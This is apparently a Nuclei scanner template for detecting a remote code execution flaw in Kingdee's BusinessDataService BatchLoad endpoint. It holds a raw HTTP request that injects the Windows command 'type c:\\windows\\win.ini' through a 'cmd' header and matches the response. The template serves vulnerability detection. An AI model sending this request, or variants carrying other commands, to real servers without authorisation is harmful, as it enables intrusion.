id: kingdee-businessdataservice-batchload-rce

info:
  name: Kingdee BusinessDataService BatchLoad RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    This template detects remote code execution vulnerability in Kingdee BusinessDataService BatchLoad endpoint.

http:
  - raw:
      - |
        POST /Kingdee.BOS.ServiceFacade.ServicesStub.BusinessData.BusinessDataService.BatchLoad.common.kdsvc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/json
        cmd: type c:\\windows\\win.ini

        {"ap0":""}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "[files]"
          - "response_error"
          - "参数产生异常"
      - type: status
        status:
          - 200
